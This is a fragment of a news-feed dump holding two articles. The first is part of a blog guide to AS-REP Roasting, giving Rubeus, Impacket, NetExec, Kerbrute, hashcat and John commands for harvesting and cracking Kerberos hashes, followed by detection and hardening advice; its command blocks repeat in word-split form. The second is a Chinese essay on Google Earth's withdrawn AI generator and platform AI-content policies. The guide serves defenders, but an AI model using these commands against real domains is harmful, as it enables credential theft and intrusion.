types\nRubeus.exe asreproast /des /format:hashcat\n# Enumerate specific Organizational Unit\nRubeus.exe asreproast /ou:\"OU=Services,DC=domain,DC=local\"\n# Use alternate credentials\nRubeus.exe asreproast /creduser:DOMAIN\\admin /credpassword:PASSWORD\n# Specify target user\nRubeus.exe\nasreproast\n/user:targetuser\n/domain:domain.local\n/dc:192.168.1.1\n# Use Kerberos encryption types\nRubeus.exe\nasreproast\n/des\n/format:hashcat\n# Enumerate specific Organizational Unit\nRubeus.exe\nasreproast\n/ou:\"OU=Services,DC=domain,DC=local\"\n# Use alternate credentials\nRubeus.exe\nasreproast\n/creduser:DOMAIN\n\\a\ndmin\n/credpassword:PASSWORD\nRubeus also supports LDAPS (LDAP over SSL) for secure queries and can output results in both Hashcat and John the Ripper formats.\nLinux-Based Tools\nImpacket’s GetNPUsers.py\nis the standard tool for AS-REP Roasting from Linux environments. It operates in both authenticated and unauthenticated modes, making it highly flexible for different scenarios\n# Unauthenticated enumeration with RPC null session\nimpacket-GetNPUsers -no-pass -dc-ip 10.0.0.1 domain.local/\n# Enumerate specific users from file\nimpacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 10.0.0.1 domain.local/\n# Authenticated enumeration and hash extraction\nimpacket-GetNPUsers domain.local/username:password -request -format hashcat -outputfile hashes.txt\n# Using NTLM hash for authentication\nimpacket-GetNPUsers -hashes 'LM:NT' -dc-ip 10.0.0.1 domain.local/username\n# Unauthenticated enumeration with RPC null session\nimpacket-GetNPUsers\n-no-pass\n-dc-ip\n10.0\n.0.1\ndomain.local/\n# Enumerate specific users from file\nimpacket-GetNPUsers\n-no-pass\n-usersfile\nusers.txt\n-dc-ip\n10.0\n.0.1\ndomain.local/\n# Authenticated enumeration and hash extraction\nimpacket-GetNPUsers\ndomain.local/username:password\n-request\n-format\nhashcat\n-outputfile\nhashes.txt\n# Using NTLM hash for authentication\nimpacket-GetNPUsers\n-hashes\n'LM:NT'\n-dc-ip\n10.0\n.0.1\ndomain.local/username\nThe\n-request\nflag initiates TGT requests and extracts crackable hashes, while\n-format hashcat\nensures output compatibility with Hashcat.\nCrackMapExec / NetExec\nCrackMapExec and its successor NetExec provide integrated LDAP-based AS-REP Roasting capabilities:\n# Authenticated enumeration\nnxc ldap 192.168.0.104 -u username -p password --asreproast output.txt\n# Unauthenticated with userlist\nnxc ldap 192.168.0.104 -u users.txt -p '' --asreproast output.txt\n# Specify domain controller\nnxc ldap 192.168.0.104 -u username -p password --asreproast output.txt -dc-ip 10.0.0.1\n# Authenticated enumeration\nnxc\nldap\n192.168\n.0.104\n-u\nusername\n-p\npassword\n--asreproast\noutput.txt\n# Unauthenticated with userlist\nnxc\nldap\n192.168\n.0.104\n-u\nusers.txt\n-p\n''\n--asreproast\noutput.txt\n# Specify domain controller\nnxc\nldap\n192.168\n.0.104\n-u\nusername\n-p\npassword\n--asreproast\noutput.txt\n-dc-ip\n10.0\n.0.1\nKerbrute\nKerbrute performs username enumeration and pre-authentication detection, providing reconnaissance data before AS-REP Roasting attacks:\n# Enumerate valid usernames\nkerbrute userenum --dc 10.0.0.1 -d domain.local users.txt\n# Manually test pre-authentication with GetTGT\nimpacket-getTGT.py domain.local/username -no-pass -dc-ip 10.0.0.1\n# Enumerate valid usernames\nkerbrute\nuserenum\n--dc\n10.0\n.0.1\n-d\ndomain.local\nusers.txt\n# Manually test pre-authentication with GetTGT\nimpacket-getTGT.py\ndomain.local/username\n-no-pass\n-dc-ip\n10.0\n.0.1\nPassword Cracking Tools\nHashcat Mode 18200\n(Kerberos 5, etype 23, AS-REP) is the standard for cracking AS-REP hashes. Performance varies significantly based on GPU hardware and encryption type:\n# Basic dictionary attack\nhashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n# Rule-based attack with optimizations\nhashcat -m 18200 -a 0 hashes.txt rockyou.txt -r best64.rule\n# Benchmark GPU performance\nhashcat -m 18200 -b\n# Basic dictionary attack\nhashcat\n-m\n18200\n-a\n0\nhashes.txt\n/usr/share/wordlists/rockyou.txt\n# Rule-based attack with optimizations\nhashcat\n-m\n18200\n-a\n0\nhashes.txt\nrockyou.txt\n-r\nbest64.rule\n# Benchmark GPU performance\nhashcat\n-m\n18200\n-b\nJohn the Ripper\nprovides an alternative cracking method with native Kerberos support:\n# Crack AS-REP hashes\njohn --wordlist=rockyou.txt --format=krb5asrep hashes.txt\n# Using rules\njohn --wordlist=rockyou.txt --rules=best64 --format=krb5asrep hashes.txt\n# Crack AS-REP hashes\njohn\n--wordlist=rockyou.txt\n--format=krb5asrep\nhashes.txt\n# Using rules\njohn\n--wordlist=rockyou.txt\n--rules=best64\n--format=krb5asrep\nhashes.txt\nDetection and Defense Methods\nDetection Techniques\nWindows Event Log Analysis:\nEvent ID 4768 (Kerberos Authentication Ticket Request) is the primary indicator for AS-REP Roasting detection and should be a critical component of any Kerberos attack monitoring strategy. The security audit log captures all TGT requests, providing valuable intelligence when properly analyzed. Security teams should establish baseline profiles for normal authentication patterns and monitor for deviations that indicate potential AS-REP Roasting activity:\nPre-Auth Type: 0\n– Indicates no pre-authentication was performed; legitimate clients should show higher values (typically 2 for PA-ENC-TIMESTAMP)\nService Name: krbtgt\n– The target service for TGT requests; watching for unusual requesters helps identify reconnaissance\nTicket Encryption Type: 0x17\n– RC4-HMAC encryption; should be replaced with 0x12 (AES-256-CTS-HMAC-SHA1-96) in secure environments\nSource IP address\n– Multiple requests from the same source, especially external IPs, indicate automated enumeration\nSuspicious patterns include rapid sequences of 4768 events from a single source querying multiple accounts with Pre-Auth Type 0 and RC4 encryption, unsuccessful AS-REQ attempts followed by successful ones after password cracking, or requests from uncommon hours that deviate from established usage patterns.\nLDAP Query Monitoring:\nMonitor Active Directory and domain controller logs for LDAP queries targeting account attributes that reveal pre-authentication status. Attackers use LDAP reconnaissance to identify vulnerable accounts, searching for the\nuserAccountControl\nattribute with the\nDONT_REQ_PREAUTH\nflag (decimal value 4194304, hexadecimal 0x400000). Tools like PowerView’s\nGet-DomainUser -PreauthNotRequired\ncmdlet generate LDAP traffic that can be detected through Directory Services log analysis. Enable Directory Services event logging on domain controllers and monitor for filter patterns that specifically query\nuserAccountControl\nvalues. Alert on multiple LDAP queries for this attribute within short time windows, particularly from non-administrative source IPs.\nHoneypot Accounts:\nDeploy decoy user accounts configured with pre-authentication disabled and assigned strong, random passwords that resist practical cracking attempts. These honeypot accounts should have no legitimate business purpose and should never receive legitimate AS-REQ requests. Any authentication attempt targeting these accounts with Pre-Auth Type 0 serves as a high-fidelity detection signal indicating active reconnaissance or exploitation. Place honeypot accounts in organizational units with restricted access and monitor their Event ID 4768 events exclusively. This approach minimizes false positives while maintaining high detection confidence.\nDefense Strategies\nEnforce Kerberos Pre-Authentication:\nThe most effective and fundamental defense is enabling pre-authentication for all Active Directory accounts. Pre-authentication verification prevents offline hash cracking by requiring users to prove identity before credential material is issued. Use PowerShell to identify and remediate vulnerable accounts across the entire domain:\n# Find all accounts without pre-authentication\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName\n# Enable pre-authentication for all vulnerable accounts\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADUser -DoesNotRequirePreAuth $false\n# Verify remediation\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true}\n# Find all accounts without pre-authentication\nGet-ADUser\n-\nFilter {DoesNotRequirePreAuth\n-eq\n$true\n}\n-\nProperties DoesNotRequirePreAuth\n|\nSelect-Object\nName\n,\nSamAccountName\n# Enable pre-authentication for all vulnerable accounts\nGet-ADUser\n-\nFilter {DoesNotRequirePreAuth\n-eq\n$true\n}\n|\nSet-ADUser\n-\nDoesNotRequirePreAuth\n$false\n# Verify remediation\nGet-ADUser\n-\nFilter {DoesNotRequirePreAuth\n-eq\n$true\n}\nBefore enabling pre-authentication for service accounts, verify that applications support modern Kerberos authentication. For legacy applications requiring pre-authentication disabled, develop migration plans or implement isolated authentication mechanisms.\nImplement Strong Password Policies:\nEnforce comprehensive password requirements that make offline cracking computationally prohibitive:\nMinimum 25+ characters for service accounts\n– Even with GPU acceleration, 25-character random passwords require years to crack\nComplexity requirements\n– Uppercase, lowercase, numbers, special characters reduce dictionary attack effectiveness\nRegular password rotation\n– Implement 30-90 day rotation cycles for service accounts\nPassword history enforcement\n– Prevent reuse of previous passwords\nAvoid dictionary words\n– Mandate random generation rather than human-creatable passwords\nApply stricter policies to privileged accounts (domain admins, service accounts, managed service accounts) than standard user accounts.\nDisable RC4 Encryption:\nTransition from RC4-HMAC (encryption type 0x17) to AES-256-CTS-HMAC-SHA1-96 (encryption type 0x12) for all Kerberos tickets. RC4 is approximately 800 times faster to crack than AES-256, making the encryption type itself a significant security lever. Configure the\nmsDS-SupportedEncryptionTypes\nattribute to enforce AES encryption across the domain\n# View current encryption types for an account\nGet-ADUser -Identity \"targetuser\" -Properties msDS-SupportedEncryptionTypes\n# Set account to AES only\nSet-ADUser -Identity \"targetuser\" -Replace @{\"msDS-SupportedEncryptionTypes\"=24}\n# 24 = AES128-CTS-HMAC-SHA1-96 (0x08) + AES256-CTS-HMAC-SHA1-96 (0x10) + RC4-HMAC (legacy, for compatibility)\n# View current encryption types for an account\nGet-ADUser\n-\nIdentity\n\"targetuser\"\n-\nProperties msDS\n-\nSupportedEncryptionTypes\n# Set account to AES only\nSet-ADUser\n-\nIdentity\n\"targetuser\"\n-Replace\n@\n{\n\"msDS-SupportedEncryptionTypes\"\n=\n24\n}\n# 24 = AES128-CTS-HMAC-SHA1-96 (0x08) + AES256-CTS-HMAC-SHA1-96 (0x10) + RC4-HMAC (legacy, for compatibility)\nFor full security, use value 16 (AES256 only) once legacy compatibility requirements are met.\nAS-REP Roasting vs. Kerberoasting: Key Differences\nUnderstanding the distinctions between AS-REP Roasting and Kerberoasting is essential for cybersecurity professionals implementing effective detection and defense strategies. While both attacks exploit Kerberos weaknesses to harvest password hashes, they operate at different stages of the authentication protocol and require different prerequisites, making them complementary techniques in a sophisticated attacker’s arsenal.\nAspect\nAS-REP Roasting\nKerberoasting\nTarget\nUsers with pre-authentication disabled\nUsers/SPNs registered in Active Directory\nRequired Access\nNone (unauthenticated possible)\nValid domain user credentials required\nKerberos Exchange\nAS-REQ → AS-REP (2 messages)\nAS-REQ → AS-REP + TGS-REQ → TGS-REP (4 messages)\nEncrypted Material\nTGT encrypted with user password hash\nService ticket encrypted with service account password hash\nEncryption Type\nTypically RC4-HMAC (0x17) only\nRC4-HMAC or AES (depends on configuration)\nTypical Targets\nLegacy apps, dormant accounts, service accounts\nService accounts, sometimes high-value users\nEvent ID Indicators\nEvent ID 4768 with Pre-Auth Type 0\nEvent ID 4769 (TGS request) anomalies\nDetection Difficulty\nMore challenging (offline phase invisible)\nEasier (TGS requests visible in logs)\nSkill Level Required\nLow (minimal protocol knowledge needed)\nLow-Medium (requires domain access)\nConclusion\nAS-REP Roasting represents a significant and persistent threat to Active Directory environments worldwide, particularly when Kerberos pre-authentication is disabled due to legacy application requirements, system migrations, or administrative oversights. The attack’s accessibility—requiring no credentials, minimal technical sophistication, and often no more than standard penetration testing tools—makes it one of the most frequently observed Kerberos-based attacks in both defensive assessments and real-world intrusions. The combination of low barrier to entry, high success rate against weak passwords, and near-complete invisibility during the offline cracking phase makes AS-REP Roasting an especially attractive attack vector for adversaries ranging from unsophisticated threat actors to advanced persistent threat (APT) groups. The attack’s effectiveness stems from the fundamental security principle that disabled security controls create vulnerabilities proportional to their criticality. Pre-authentication is not an optional hardening measure; it is a core component of Kerberos security designed specifically to prevent offline password attacks. Organizations that disable this control, even with justifiable business reasons for legacy application support, accept significant security risk if they lack compensating controls. The problem compounds when organizations maintain inventory gaps—not knowing which accounts have pre-authentication disabled, unable to quantify their exposure, or lacking the confidence to enable pre-authentication due to fear of breaking unknown applications.\nThe real-world impact of compromised credentials obtained through AS-REP Roasting extends far beyond individual account compromise. Attackers leverage these credentials as initial footholds for sophisticated multi-stage intrusions, using them to conduct lateral movement, escalate privileges, establish persistence through additional credential harvesting or backdoor installation, and ultimately compromise critical business systems and sensitive data. Organizations have reported incidents where AS-REP Roasting success directly enabled ransomware deployment, intellectual property theft, and financial fraud. The financial and reputational consequences of breaches originating from preventable AS-REP Roasting vulnerabilities create strong business justifications for remediation investments. A truly comprehensive defense strategy requires both proactive technical hardening and sustained operational vigilance. Organizations must establish structured remediation programs targeting pre-authentication disabled accounts, treating this as a critical security priority alongside other Kerberos hardening initiatives. Implementation should prioritize immediate pre-authentication enforcement for accounts where business requirements permit, followed by aggressive timelines for migrating or eliminating accounts requiring pre-authentication disabled status. Simultaneously, organizations must implement strong password policies specifically for service accounts and legacy application accounts—these accounts often carry elevated privileges and attract disproportionate attacker focus. The transition from RC4 to AES encryption should begin immediately for systems supporting modern encryption, as this single change makes AS-REP hash cracking computationally prohibitive. Continuous monitoring through SIEM platforms, behavioral analytics, and specialized Active Directory security tools provides real-time detection capabilities and forensic visibility for incident response.\nOnly through this integrated approach combining preventive technical controls, operational vigilance, continuous monitoring, and sustained organizational commitment can enterprises effectively defend against AS-REP Roasting and related Kerberos attacks. The threat landscape continues evolving as attackers develop more sophisticated variations and integrate Kerberos attacks into larger intrusion frameworks, making defense an ongoing security imperative rather than a one-time remediation project. Security leaders should treat Kerberos attack surface reduction as a strategic identity security initiative, not merely a compliance checkbox, given the foundational role Active Directory plays in enterprise security infrastructure.\nCritical CUPS Vulnerability (CVE 9.9) in Linux\nWhat is Silver Ticket Attack: A Comprehensive Guide\nTop 8 Brute Force Tools and Reverse Brute Force Methods\nWhat is Kerberoasting Attack – Kerberoasting: A Comprehensive Guide\nDeep Dive CVE-2026-40138: Pre-Authentication Authentication Bypass in BeyondTrust Remote Access Solutions\nviperone.gitbook.io: AS-REP Roasting\nattack.mitre.org: Steal or Forge Kerberos Tickets: AS-REP Roasting\nvaadata: Active Directory Monitoring: LDAP Log Analysis and ELK Rules\nsplunk: Detecting Active Directory Kerberos Attacks: Threat Research Release\nThe post\nWhat is AS-REP Roasting Exploitation: A Comprehensive Guide\nappeared first on\nDenizHalil - Professional Cybersecurity Consulting and Penetration Testing\n.",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "rss",
-      "content_source_url": "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/",
-      "content_chars": 28597,
-      "content_sha256": "304a924bf05c53e5a1862a9f61761fa536d498120e07da66d267365451095aad",
-      "content_fetched_at": "2026-08-03T22:14:28.916751+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "DenizHalil Blogs",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:3b6150c7f9e06ab2",
-      "kind": "publish",
-      "text": "yage-share published: 界面承诺决定平台态度：从 Google Earth 事件看 AI 内容治理",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-08-03T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html",
-      "title": "界面承诺决定平台态度：从 Google Earth 事件看 AI 内容治理",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "AI 内容治理\n平台政策\n记录界面里出现了一个生成按钮\n2026 年 7 月 30 日，Google 在网页版\nGoogle Earth\n里放进了一个新的生成按钮，背后用的是自家的图像生成模型\nNano Banana 2\n。Google 当时的想法其实挺直白：他们想把 Google\nEarth\n从一个单纯查卫星图的数据库，变成一个能帮你做假设推演的互动工具。比如做城市规划、模拟气候灾害，或者地理教学，你只要把地图拉到任何一个地方（这是真实的卫星画面输入），再敲进一句提示词（比如模拟暴雨淹没后的街区），就能在真实的卫星底图上直接合成出一张逼真的假想图（这是输出）。\n不过这个功能上线才刚刚一天，Google 就紧急把它撤了下来。Google 在\n官方声明\n里直接说明了原因：「我们深知大家对\nGoogle Earth\n抱有独特的信任，把它当作观察真实世界的可靠窗口……但我们也看到，有人在社交平台上分享了一些生成的截图，看起来违反了我们的政策。在准备好更严格的防御措施之前，我们决定先撤回这个功能……这些生成的图片此前并没有直接呈现在其他人的主界面里，而且图片上也带上了\nAI 生成的水印。」\n读到这里，你可能会产生一个很自然的疑问：既然 Google\n在声明里强调图片上有 AI\n水印，而且这些生成结果并没有直接替换掉其他人屏幕上的真实地图，那大家为什么还会把它们当成现实中发生的事情？\n关键就在于图片离开界面后的传播场景。用户在 Google Earth\n网页里生成假想图后，随手就会截个图，发到 X（Twitter）、Reddit\n或者微信群里。一旦图像脱离了 Google Earth\n原生界面的约束，那些边角上的轻量 AI\n标注或隐形水印在社交平台上就基本失效了：普通网友刷社交媒体时，压根不会拿专门的技术工具去扫水印，大家眼里看到的，就是一张带着\nGoogle Earth 标志性视角和真实地形的卫星截图。\n上线当晚，开源情报分析师 Henk van Ess\n跑去试了一下，发现安全拦截很容易被绕过去。他一口气生成了洛杉矶不存在的弹坑、被水淹没的国会大厦、着火的\nGoogleplex、倒塌的埃菲尔铁塔、伊朗核电站，还有加沙医院被炸毁的画面（据\nArs\nTechnica\n报道\n）。当这些截图被传到社交平台后，受众顺着过去的习惯，第一反应依然是这是从\nGoogle Earth 上截下来的真实卫星图。van Ess 在接受\nBBC\n采访\n时讲的那句话，正好点破了这个玄机：「伪造图本身不需要看起来天衣无缝，它直接继承了诞生它的那张地图的信誉。」\n这句话道出了界面设计里一个很容易被忽略的细节。过去二十年来，记者、情报分析人员和救援团队都习惯拿\nGoogle Earth\n当作核对现实的底牌。大家在这个界面里看图时，压根不会去怀疑图片的真假，就像你在\nGoogle\n导航上看到一条路，不会怀疑那条路根本不存在一样。当生成按钮直接嵌进这个界面时，地图给人的感觉还是客观记录，但输出的内容却已经变成了算法模拟。大家顺着过去的习惯去看图，就把合成画面当成了现实证据，期待和界面的实际属性就这么错开了。\nTechPolicy.Press\n的评论\n对这件事的总结也很传神：「Google Earth\n不再只是对现实的记录，它变成了一个能够制造逼真现实的生成器，把大家最信任的现实基础设施与生成式\nAI 之间的边界给抹平了。」\n信用比来源证明传播得更远：事实界面的信用随导出物传播，provenance\n信号在离开界面后衰减\n信用比来源证明传播得更远\nGoogle Earth\n事件暴露了一个很现实的问题：当生成图通过截图流向社交网络，光凭这是从权威界面截出来的这一视觉印象，就足够让不少人把假图当成真新闻了。那么，后续靠技术手段去查验这些图片的真伪，到底可不可行？\n图片一旦离开了原生界面被到处转发，查清来源往往就很费劲了。2026 年 3\n月 8 日，伊朗媒体\nTehran Times\n在 X\n上发了一组前后对比的卫星图，声称巴林的美军基地雷达被炸毁了。新闻核查团队\nBBC Verify\n随后拿这张图做了调查。如果只靠肉眼看，图片其实有很低级的漏洞，比如基地外面停着的几辆小车，在号称隔了一整年的两张卫星图里，停的位置居然分毫不差。\n不过肉眼看到的破绽只是疑点，真正拿出过硬技术物证的，是 BBC Verify\n调用的\nGoogle SynthID watermark detector\n（SynthID\n检测器）。SynthID 是 Google 搞的一种像素级隐形水印，只要是用 Gemini 或者\nGoogle 的 AI\n工具做出来的图，像素底层都会静默打上这种标记，一般的剪裁、打码或微调都不容易把它洗掉。检测器直接从像素底层证实了这张所谓的战时卫星图，确实是用\nGoogle 的 AI 工具伪造或者修改出来的（详见\nBBC Verify\n报道\n）。\n这是第一个被 SynthID\n在技术层面实锤的战时虚假信息案例，说明靠水印追溯在技术上确实行得通。但问题在于，这种追溯非常依赖有人主动拿着工具去查，而且前提是图片在各个平台转发的过程中，水印信号还没被折腾掉。\n现实中的传播链条可没这么理想。比如行业里推行的\nC2PA\n标准，这是由 Adobe、微软等公司联合发起的开源内容凭证协议（Content\nCredentials）。它的做法是在图片或视频文件里插入加密数字签名，记录下这张图是用什么\nAI\n工具做的、经过了哪些修改。但这种方案有个致命弱点：签名是藏在文件的元数据里的。只要用户一截图，或者把原图传到\nFacebook、Instagram、X 或 WhatsApp\n上，社交平台为了省带宽做压缩转码，就会顺手把文件里的元数据全抹掉。这倒不是平台故意要帮伪造者遮掩，纯粹是网络分发转码时的附带伤害（详见\nSoftwareSeni\n技术分析\n）。直接埋在像素里的\nSynthID\n确实不怕普通截屏，但它既看不见，又绑定了 Google 自己的私有算法，Google\n的检测器认不出 OpenAI 的水印，反过来也一样（据\nArs\nTechnica 实测\n）。甚至网上早就有了免费的抹除工具（比如\nremovesynthid.io\n）和各种\n破解教程\n。开发者\nSean Goedecke 就直言，如果大家不都把签名用起来，C2PA\n就更容易变成表面功夫。比如 FotoForensics\n网站每周收到几万张图，里面带有效签名的往往只有十几张（见\nSean\nGoedecke 的分析\n）。\n这就造成了一种很无奈的落差，就像大家常说的“造谣一张嘴，辟谣跑断腿”：大平台和权威界面带给人的信任感可以跟着截图到处传，但证明这张图是\nAI 做的标记，却在转发过程中一路流失。\nGoogle Earth\n用二十年攒下的权威信用，被一张导出的截图轻易带走了，而要证明它是假的，却得靠专业的检测工具和繁琐的核验流程才能看出来。\nBBC Verify 的测试也证实了这一点：\nSynthID\n在 Google\n自家的 Gemini 和 Lens\n里识别率确实不错，但依然有办法绕过去；如果遇到稍微调过色或处理过的图片，第三方的检测工具经常直接失灵（详见\nBBC\n测试结果\n）。这种困境光靠把水印算法做得更厉害是很难解决的，因为信任在人际网络里的传播速度，本来就比技术验证流失的速度快得多。\n三种态度由界面承诺与商业激励共同决定：禁止、标注/降权、拥抱\n界面承诺是首要因子\n既然水印和技术标记在跨平台传播时必然会流失，平台显然就不能把希望全都寄托在事后验证上。在\n2024 到 2026 年这几年间，全球主要的互联网平台在面对 AI\n生成内容时，逐步演化出了三种截然不同的治理态度：直接封杀、打上标签，以及全面拥抱。有趣的是，平台选哪条路，可不是随机拍脑门定的。\n把\nWikipedia\n和\nSnapchat\n放在一起对比，这种差别就特别明显。2026 年 3 月 20\n日，\nWikipedia\n的编辑社区以 44 对 2\n的压倒性票数，决定严禁用大语言模型来生成或改写百科条目，只留了翻译和微调错别字这两个小开口（详见\nQuartz\n报道\n与\nAI\nAutomation 政策解读\n）。社区最担心的就是 AI\n弄乱了每句话都要有明确作者和可靠来源的铁律，还可能让互联网充斥 AI\n自己抄自己的垃圾。但同一时间的\nSnapchat\n完全是另一个画风，他们在 2025 年底把 Imagine Lens 滤镜免费放给了 3.5\n亿日活用户，AI 滤镜播放量刷到了 380 亿次，2026 年更是顺势推出了全套 AI\n广告生成工具（见\nSnapchat\n官方公告\n）。\n两个平台之所以选了截然相反的方向，根子在于它们平时给用户做出的承诺不一样。维基百科给人的承诺是可核查的严肃事实档案，每句话都要有人负责；而\nSnapchat 给人的预期就是朋友间找乐子的 AR 滤镜。在维基百科里塞进 AI\n生成，等于直接砸了自己的招牌；但在 Snapchat\n里，搞怪和好玩本来就是产品的一部分，大家看到恶搞滤镜根本不会当真。\nGoogle Earth\n之前那次踩坑，也是撞在了这根线上。作为大家查地理和地图的基准工具，它背负着极高的事实记录属性。直接在地图主界面里安一个生成按钮，等于在承诺没变的情况下，悄悄把给用户看的东西从事实变成了算法模拟。如果当时把它做成一个独立的虚拟沙盒模式，加上醒目的状态提示和原图对比，大家的反应绝不会这么大。\n连同一家大厂内部，不同产品的策略也是大相径庭的：Google 在\nGoogle Earth\n上发现不对立刻撤回，但在 Gemini\n对话界面里大力推广生成；Meta 在 Facebook\n社区里严查政治敏感生成图，但在自己的设计软件 Meta Imagine\n里却鼓励大家随便画；\nLinkedIn\n之前还兴冲冲地推出了 AI\n帮你写文章的功能，到了 2026 年 7 月 31\n日又赶紧把这个功能关了，反而上线了一个怀疑是 AI\n垃圾内容的举报按钮。决定平台政策的不是大厂口头上的价值观，而是具体产品和用户之间那份看不见的信任约定。\n三种态度的深层困境与治理外包\n如果我们顺着界面承诺的视角深入看下去，就会发现封杀、打标、拥抱这三条路径背后，各自对应着非常具体的现实困境与治理逻辑。\n对于那些一旦出错后果极严重的领域，大家最普遍的防线就是直接一刀切。\nBBC\n在内部测试里发现 AI 助手做新闻有 45%\n的概率会捏造或弄错事实，于是干脆严禁在新闻采编出版里直接用生成工具（见\nMedia Copilot\n分析\n）。像\nElsevier\n、\nSpringer Nature\n、\nWiley\n、\nScience\n和\nCell\n这些顶级学术期刊，也全都拒绝把 AI\n当成论文作者，而且绝大多数都不允许提交 AI 做出来的实验图片（见\n学术出版政策汇总\n）。音乐平台\nBandcamp\n和\nQobuz\n也一样，坚决不收纯 AI\n生成的歌曲。这些地方的共同点就是：一旦假内容混进去了，事后澄清和收回的成本太高了。\n至于靠打上 AI\n生成标签让大家自己去辨别，实际效果其实挺尴尬的。多伦多都市大学 The Dais\n找了 2472\n个人做实验，发现平时大家见到的那些小标签，对大家信不信或者转不转发几乎没影响，只有那种挡住整张屏幕的强弹窗警告才管用（见\nThe Dais\n实验分析\n）。MIT 做了 7500 多人的实验也发现，光贴一个中性的 AI\n生成标签，远不如直接标上虚假内容来得管用，有时候漏标了反而会让没贴标的内容看起来更像真的（见\nMIT\n实验报告\n）。平台自己心里也有数，知道光打标只是应付合规，所以大家现在基本都是打标加控钱与算法组合拳：\nTidal\n给 AI 歌曲贴标签的同时，直接把它们的版税收益给清零了（据\nVariety\n报道\n）；\nTikTok\n水印、元数据和用户自报三管齐下，标了 30\n多亿条视频（见\nTikTok\n治理数据\n）；\nLinkedIn\n则是一边放开举报入口，一边用算法自动降权，一天就能拦截几十万次机器人灌水（据\nFortune\n报道\n）。\n那些选择全面拥抱 AI\n的平台，说白了是把鉴别的责任交给了用户或者市场自己。像\nAdobe Firefly\n推出创意助手（见\nAdobe\n发布说明\n），\nCanva\n靠 Magic Studio 卖到了 40\n亿美元年收入，\nNotion\n把 AI\n当成主打卖点，因为大家用这些工具本来就是为了干活和搞创意，没人觉得里面的输出是严肃的现实依据。\nEpic Games Store\n坚持不强制要求标注 AI 游戏资产，CEO Tim Sweeney 还吐槽 Steam\n强迫开发商披露做法太苛刻（据\nVGC\n报道\n）。但 Steam 的公开数据显示，带有 AI 标签的游戏平均评论数少了\n53%，说明玩家心里其实非常介意，不打标只是把风险留给了买游戏的玩家。\n大家之所以这么头疼，根本原因在于 AI\n生产太快，而人工审查根本跟不上。Starling Lab 算过一笔账：人类用了 149\n年才拍出了 15 亿张照片，而生成式 AI 只要 18 个月就画出了同样多的图（见\nStarling\nLab 数据分析\n）。\nLinkedIn\n每天拦截的自动化灌水，比\nFacebook 过去一个月封的账号还要多（据\nMediaPost\n报道\n）。虽然有半数 Z 世代用户说看到 AI\n垃圾内容就想取关，但社交平台上依然有成千上万的推文在靠自动化农场维持热度（见\nValue\nAdd VC 报告\n）。过去 Web2\n靠封几个账号就能搞定审核的旧办法，在脱离真实身份的批量生产面前已经不管用了。\n况且政策也在一步步逼近。2026 年 8 月 2 日，\nEU\nAI Act 第 50 条\n和\n加州 SB 942 细则\n同一天生效了。欧洲要求合成内容必须带上机读标记，不然最高罚 1500\n万欧元或者全球营收的\n3%；加州则规定月活过百万的平台得免费给用户提供验证工具和隐性水印。Google\nEarth 当时紧急关掉功能，刚好就在这个法规生效日的前两天。\n结语：从「是否 AI」到界面契约\n如果我们回头看看自己的产品，想评估怎么做 AI\n治理，有三个衡量指标特别管用：产品的界面是不是偏向客观严肃记录、一旦大家看错图造成的代价有多大，以及生成的标记在传播里会不会轻易掉光。如果当时拿这套思路去给\nGoogle Earth\n做设计，最稳妥的办法显然不是在主参考界面里直接塞个按钮，而是把它单独拉出来做一个虚拟沙盒模式，加上醒目的状态标识，再提供和真实卫星图的同屏对比。只要界面的原本承诺没有被打破，大家自然就不会产生错误的期待。\n当然，也有不少同行觉得平台这些操作全都是商业利益算计，界面承诺无非是事后找的漂亮借口。比如\nSnapchat 开放功能是为了拉长停留时间，Tidal\n切断版税是为了保住音乐人的钱袋子，LinkedIn\n清理垃圾内容是为了防止自己的职业网络变得不值钱。商业利益确实能解释平台为什么在这个时间点出手，但它单凭自己很难解释为什么同一家巨头旗下的不同产品，会采取完全相反的态度。这两个视角其实不矛盾，刚好互为补充。\n说到底，光死磕这张图或者这段话是不是 AI\n做的，往往很难找到满意的答案。真正决定产品安全和治理路线的，是生成技术到底改变了内容的什么属性、界面给用户传递了什么样的信任，以及大家在发现真相之前会凭这些内容去干什么。当做产品的人不再指望某一个万能的水印或标签，而是重新审视自己界面和用户之间的那份信任契约时，AI\n内容治理的难题才算找到了真正落地的解法。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html",
-      "content_chars": 6440,
-      "content_sha256": "e1899349c2091b6a0d1ca3cfdb415b7bff78bc90b81389961dbcc80ba4290052",
-      "content_fetched_at": "2026-08-03T22:14:08.047484+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:7781a639e9c3c9a4",
-      "kind": "publish",
-      "text": "yage-share published: 机器人、芯片与稀土的保护主义成功条件",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-08-02T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/us-robot-ban-protectionism-20260802.html",
-      "title": "机器人、芯片与稀土的保护主义成功条件",
-      "via": "rss",
-      "collect_mode": "rss",
